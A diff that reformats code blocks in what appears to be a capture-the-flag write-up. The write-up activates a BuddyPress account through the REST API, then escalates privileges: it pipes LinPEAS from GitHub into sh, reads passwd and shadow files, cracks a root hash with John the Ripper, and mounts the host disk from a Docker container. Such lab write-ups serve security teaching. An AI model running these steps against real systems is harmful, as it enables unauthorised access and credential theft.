@@ -115,8 +115,8 @@ On the buddypress rest api docs, if you scroll down only 2 divs you can find an 
  
 
 Lets craft a request for this endpoint to try and activate the account we just made.
-``` 
 Request
+``` 
 PUT /wp-json/buddypress/v1/signup/activate/tg2WcJEbkzRnOBwwRjzPDYN05qpJPL1L HTTP/1.1
 HOST: 192.168.0.16:7006
 Content-Length: 0
@@ -125,8 +125,8 @@ Content-Type: application/json; charset=UTF-8
 {
 }
 ```
-``` 
 Response
+``` 
 HTTP/1.1 200 OK
 Date: Wed, 11 Jan 2023 20:57:16 GMT
 Server: Apache/2.4.38 (Debian)
@@ -272,9 +272,9 @@ Priv esc
 First let's  get a list of users by reading the contents of the passwd file
 
 
-
+```
 cat /etc/passwd
-
+```
 
 
 
@@ -288,9 +288,9 @@ Let's start by running LinPEAS, LinPEAS is a script that searches for possible p
 
 
 Start by using curl to pull and run the latest compiled branch of LinPEAS
-
+```
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
-
+```
 
 LinPEAS will format the results in the following color code based on the % chance of success of a vector.
 
@@ -304,9 +304,9 @@ Interesting results
 Shadow files shouldn’t be accessible to low privileged users, this file contains a list of all user accounts and password hashes
 
 Let's take a close look at the entry for root.
-
+```
 root:$6$.ctyXo1jtgIm.fCk$PgUb7kyoLElbx5IBNzw9KKDLnxlanLv15LY0pELWDvWR4mstD4kUnzBPFTM1D3khueJ5j1gwIFBxzY9kPPJF80:19369:0:99999:7:::
-
+```
 
 Understanding the shadow file format.
 ```
@@ -324,9 +324,9 @@ Field 5 maximum number of days the password is valid
 Field 6 The number of days before password is to expire that user is warned that his/her password must be changed
 ```
 We can save the shadow file in the working directory and use john the ripper to compare the target hash vs a wordlist that the tool will hash with the SHA-512 algo. If a match is found it will present us with the unhashed value. https://github.com/openwall/john
-
+```
 john --wordlist=/usr/share/wordlists/john.lst --rules shadow
-
+```
 
 We are using the provided john.lst wordlist provided with kali linux. 
 
@@ -342,9 +342,9 @@ The root password is security.
 Let's elevate the shell to root.
 Run the su command with target user root
 “su” is short for substitute or switch user
-
+```
 su root
-
+```
 
 whoami to check current user
 
@@ -360,9 +360,9 @@ It also runs some instance detection to detect if we are running inside of a con
 Looks like we are running inside a docker container, i wonder what if anything is outside of the box?
 
 Let's check if the host disk is mounted.
-
+```
 fdisk -l
-
+```
 
 
 
@@ -371,22 +371,22 @@ Result, looks like the host filesystem is indeed mounted.
 We should be able to mount this drive and access the filesystem.
 
 First lets create a new directory for the filesystem
-
+```
 mkdir /mnt/xvda1
-
+```
 
 Lets move into the mounted filesystem and have a look at the passwd file to get an idea of who we are.
 
 
 Let's check the permissions we have on the host shadow file
-
+```
 ls -l /mnt/xvda1/etc/shadow
-
+```
 
 We have read and write perms
-
+```
 -rw-r----- 1 root shadow 840 Jan 13 20:51 /mnt/xvda1/etc/shadow
-
+```
 
 Bonus points if you can find the flag!
 
